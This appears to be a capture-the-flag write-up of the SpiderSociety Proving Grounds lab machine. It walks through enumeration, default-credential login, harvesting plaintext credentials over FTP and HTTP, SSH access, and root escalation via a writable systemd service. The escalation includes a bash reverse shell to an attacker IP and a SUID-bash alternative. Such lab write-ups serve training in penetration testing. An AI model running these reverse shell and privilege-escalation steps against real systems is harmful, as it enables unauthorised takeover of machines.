# SpiderSociety

## Initial access

Ran `autorecon` to enumerate the target:

```
sudo autorecon 192.168.236.214
```

Open ports discovered:

- **22 (TCP)** — SSH (OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0))
- **80 (TCP)** — HTTP (Apache httpd 2.4.58 ((Ubuntu)))
  - Additional webpages:
    - `http://192.168.236.214/404.html`
    - `http://192.168.236.214/images/`
- **2121 (TCP)** — FTP (vsftpd 3.0.5)

FTP enumeration was performed first. Anonymous login was attempted on port 2121 but was rejected:

```
ftp anonymous@192.168.236.214 -p 2121
Connected to 192.168.236.214.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
```

The website at `http://192.168.236.214` was visited next. The page contained no interesting content, and the login button redirected to a 404 page that looped back to the index.

Directory busting was performed on the web server:

```
feroxbuster -u http://192.168.236.214/ -t 10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -e
...
[####################] - 19m  1543815/1543815 1355/s  http://192.168.236.214/libspider/
```

A hidden directory `libspider` was discovered, which led to a login page at `http://192.168.236.214/libspider/`. Default credentials `admin:admin` successfully authenticated and redirected to the control panel at `http://192.168.236.214/libspider/control-panel.php`.

The **Communications** button on the control panel revealed credentials for an FTP backup user:

- **Username:** `ss_ftpbckuser`
- **Password:** `ss_WeLoveSpiderSociety_From_Tech_Dept5937!`

These credentials were used to log in to the FTP server on port 2121. The directory listing revealed the web root:

```
ftp ss_ftpbckuser@192.168.236.214 -p 2121
Connected to 192.168.236.214.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: ss_WeLoveSpiderSociety_From_Tech_Dept5937!
230 Login successful.

ftp> ls -al

drwxr-xr-x    4 1002     1002         4096 Apr 14  2025 .
drwxr-xr-x    4 1002     1002         4096 Apr 14  2025 ..
-rwxr-xr-x    1 0        0            1391 Apr 14  2025 404.html
drwxr-xr-x    2 0        0            4096 Apr 14  2025 images
-rwxr-xr-x    1 0        0            4317 Apr 14  2025 index.html
drwxr-xr-x    2 0        0            4096 Apr 14  2025 libspider
-rwxr-xr-x    1 0        0            1345 Apr 14  2025 simple.py

ftp> get simple.py

ftp> cd libspider
250 Directory successfully changed.
ftp> ls -al
drwxr-xr-x    2 0        0            4096 Apr 14  2025 .
drwxr-xr-x    4 1002     1002         4096 Apr 14  2025 ..
-r--------    1 33       33            170 Apr 14  2025 .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
-rwxr-xr-x    1 0        0            5436 Apr 14  2025 control-panel.php
-rwxr-xr-x    1 0        0            1389 Apr 14  2025 fetch-credentials.php
-rwxr-xr-x    1 0        0            3752 Apr 14  2025 index.php
-rwxr-xr-x    1 0        0             713 Apr 14  2025 login.php
-rwxr-xr-x    1 0        0             88 Apr 14  2025 logout.php
-rwxr-xr-x    1 0        0             51 Apr 14  2025 users.php

ftp> get .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
local: .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv remote: .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
229 Entering Extended Passive Mode (|||43283|)
550 Failed to open file.
```

Two interesting files were identified:

- `simple.py` — downloaded from the FTP root.
- `.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv` — a hidden file inside `/libspider/` with restricted permissions (`-r--------`). It could not be downloaded via FTP but was accessible over HTTP.

The hidden file was accessed directly via HTTP, revealing plaintext credentials:

```
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!

DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```

A new set of credentials was obtained for the `spidey` system account. SSH login was attempted with these credentials:

```
ssh spidey@192.168.236.214
spidey@192.168.236.214's password: WithGreatPowerComesGreatSecurity99!

spidey@spidersociety:~$ whoami
spidey
```

SSH access was gained as `spidey`. The `local.txt` flag was retrieved:

```
spidey@spidersociety:~$ cat local.txt
3762df1a84c70dac7bb57dbd1350a6ef
```

### Alternative Initial Access — PHP webshell via FTP

After obtaining FTP credentials through the admin panel (`admin:admin`), a PHP webshell can be uploaded to the web root and used to gain an initial shell as `www-data`. Since the hidden secrets file `.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv` is owned by uid 33 (`www-data`), it becomes readable once a `www-data` shell is obtained — bypassing the FTP download restriction. The credentials from the file are then reused for SSH access as `spidey`.

Credit: [The Husky Hacker — SpiderSociety Writeup - Proving Grounds](https://hackindex.io/index.php/writeups/spidersociety)

## Privilege escalation

Uploaded `linpeas.sh` to the target for enumeration:

```
scp linux/enum/linpeas.sh spidey@192.168.236.214:/tmp
spidey@192.168.236.214's password: WithGreatPowerComesGreatSecurity99!
```

Ran `linpeas.sh` to identify privilege escalation vectors:

```
spidey@spidersociety:~$ cd /tmp
spidey@spidersociety:/tmp$ ./linpeas.sh
```

Linpeas highlighted two key findings. The `spidey` user has passwordless sudo access to specific `systemctl` commands, and has write permissions over a systemd service file:

```
╔══════════╣ Checking 'sudo -l', sudoers files, and privileged Python paths (T1548.003)
User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
...
╔══════════╣ Permissions in init, init.d, systemd, and rc.d (T1543.002)
You have write privileges over /etc/systemd/system/spiderbackup.service
The following files aren't owned by root: /etc/systemd/system/spiderbackup.service
```

The targeted service file was examined:

```
spidey@spidersociety:/tmp$ cat /etc/systemd/system/spiderbackup.service
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

The service runs `/usr/local/bin/spiderbackup.sh` as root. Since the service file is writable by `spidey`, the `ExecStart` directive was modified to point to a custom reverse shell script.

A reverse shell script was created at `/tmp/rev.sh`:

```
spidey@spidersociety:/tmp$ nano rev.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.208/4444 0>&1

chmod +x rev.sh
```

The service file was edited to change `ExecStart` from `/usr/local/bin/spiderbackup.sh` to `/tmp/rev.sh`:

```
nano /etc/systemd/system/spiderbackup.service
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/rev.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

The service was reloaded and restarted with sudo to trigger the reverse shell as root:

```
spidey@spidersociety:/tmp$ sudo /bin/systemctl restart spiderbackup.service
spidey@spidersociety:/tmp$ sudo /bin/systemctl daemon-reload

# root shell caught on listener

root@spidersociety:/# whoami
root
```

The `proof.txt` flag was retrieved:

```
root@spidersociety:/# cd /root
root@spidersociety:~# cat proof.txt
d11784f1adb23653b94c2eb48708901b
```

### Alternative Privilege Escalation — SUID bash via systemd service

Instead of spawning a reverse shell, the `spiderbackup.service` file can be modified to grant SUID permissions to `/bin/bash`. The `ExecStart` is changed to set the SUID bit on bash using `chmod`, then the service is restarted. After `daemon-reload`, `bash -p` is executed to obtain a root shell:

```
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "chmod +s /bin/bash"
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

```
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart spiderbackup.service
/bin/bash -p
```

Credit: [Adrian Reategui — SpiderSociety Proving Grounds Write-Up](https://adrianreatva.com/blog/posts/provinggrounds/linux/pg1)
